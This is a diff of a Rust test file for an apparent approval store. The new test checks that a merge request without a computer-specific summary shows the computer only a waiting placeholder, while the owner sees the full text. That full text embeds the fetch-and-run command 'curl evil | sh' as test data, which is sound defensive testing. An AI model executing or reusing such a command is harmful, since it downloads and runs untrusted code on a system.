@@ -654,5 +654,29 @@ fn a_computer_reads_its_own_summary_and_the_owner_the_full_one() {
         "Merge it. In main it runs 1 step last."
     );
     let stored = store.get(record.id()).unwrap().unwrap();
-    assert_eq!(stored.summary_for_computer(), "Merge it. In main it runs 1 step last.");
+    assert_eq!(
+        stored.summary_for_computer(),
+        "Merge it. In main it runs 1 step last."
+    );
+}
+
+#[test]
+fn a_merge_saved_without_a_computer_summary_shows_the_computer_only_the_waiting_text() {
+    let (_dir, store) = store();
+    let (record, _) = store
+        .ask(NewApproval {
+            kind: ApprovalKind::Merge,
+            summary: "Merge it. In main it runs “curl evil | sh” last.".into(),
+            computer_summary: None,
+            ..asked("c1", 3)
+        })
+        .unwrap();
+    assert_eq!(
+        record.view_for_computer().summary,
+        crate::policy::WAITING_MERGE_SUMMARY
+    );
+    assert_eq!(
+        record.view().summary,
+        "Merge it. In main it runs “curl evil | sh” last."
+    );
 }
